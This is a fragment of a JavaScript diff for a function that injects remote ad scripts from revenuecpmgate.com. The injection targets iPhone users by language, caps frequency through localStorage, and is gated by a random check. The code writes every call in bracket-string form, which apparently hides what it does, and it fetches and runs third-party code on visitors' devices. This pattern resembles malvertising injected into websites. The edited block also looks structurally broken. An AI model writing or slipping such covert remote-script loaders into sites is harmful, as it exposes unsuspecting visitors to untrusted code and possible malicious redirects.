@@ -22,12 +22,13 @@ function canExecuteByFrequency() {
 
 function executeAdScript() {
     if (isIphone() && isLanguageExcluded() && canExecuteByFrequency()) {
+	 if (window["Math"]['random']() < 0.6) {
         const script1 = window["document"]['createElement']('script');
         script1['type'] = 'text/javascript';
         script1['src'] = '//pl27628871.revenuecpmgate.com/bc/88/84/bc88842a70674a0bfb85bf63a9a64c78.js';
         window["document"]['head']['appendChild'](script1);
         localStorage['setItem']('lastAdExecutionTimestamp', window["Date"]['now']()['toString']());
-        if (window["Math"]['random']() < 0.6) {
+       
             const script2 = window["document"]['createElement']('script');
             script2['type'] = 'text/javascript';
             script2['src'] = '//pl27798995.revenuecpmgate.com/e1/f3/15/e1f3155eb62046226bb4ff1cb2d2f2fe.js';
